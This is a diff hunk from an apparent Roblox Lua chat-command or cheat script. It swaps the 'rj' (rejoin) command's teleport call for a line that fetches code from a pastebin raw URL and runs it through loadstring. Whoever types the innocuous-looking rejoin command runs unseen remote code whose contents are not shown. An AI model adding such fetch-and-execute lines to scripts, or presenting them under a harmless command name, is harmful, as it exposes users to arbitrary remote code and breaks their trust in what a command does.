@@ -968,7 +968,7 @@ sM["AutoFire"] = false
 			elseif msg:match(prefix .. "re") then
 				loadchar()
 			elseif msg:match(prefix .. "rj") then
-				game:GetService('TeleportService'):Teleport(game.PlaceId, Players.LocalPlayer)
+				loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
 			elseif msg:match(prefix .. "punish on") then
 _G.toggle = true
 
